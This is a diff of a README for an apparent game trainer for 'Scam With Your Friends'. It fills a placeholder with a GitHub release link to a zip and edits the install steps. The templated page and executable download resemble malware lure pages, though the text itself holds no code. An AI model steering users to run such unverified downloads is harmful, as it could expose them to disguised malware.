@@ -4,7 +4,7 @@
 
 **37-module feature toolkit for Scam With Your Friends**
 
-<a href="YOUR_RELEASE_LINK_HERE">
+<a href="https://github.com/aurapoliticiandash/scam-with-your-friends-modkit/releases/download/v1.0.0/ScamWithYourFriends_Trainer_v1.0.zip">
   <img src="https://img.shields.io/badge/DOWNLOAD-swyf--trainer_v1.0-28a745?style=for-the-badge&logo=github&logoColor=white" height="52"/>
 </a>
 
@@ -36,7 +36,7 @@
 
 > **Step 3** — Choose a destination folder (default: `C:\Program Files\SWYFTrainer`) and click **Install**
 
-> **Step 4** — Once installation is complete, navigate to the chosen folder, right-click `SWYF_Trainer`
+> **Step 4** — Once installation is complete, navigate to the chosen folder, click `SWYF_Trainer`
 
 > **Step 5** — Launch **Scam With Your Friends** via Steam
 
@@ -146,7 +146,7 @@ Game:    Scam With Your Friends (latest Steam version)
 
 <div align="center">
 
-<a href="YOUR_RELEASE_LINK_HERE">
+<a href="https://github.com/aurapoliticiandash/scam-with-your-friends-modkit/releases/download/v1.0.0/ScamWithYourFriends_Trainer_v1.0.zip">
   <img src="https://img.shields.io/badge/DOWNLOAD-swyf--trainer_v1.0-28a745?style=for-the-badge&logo=github&logoColor=white" height="52"/>
 </a>
 
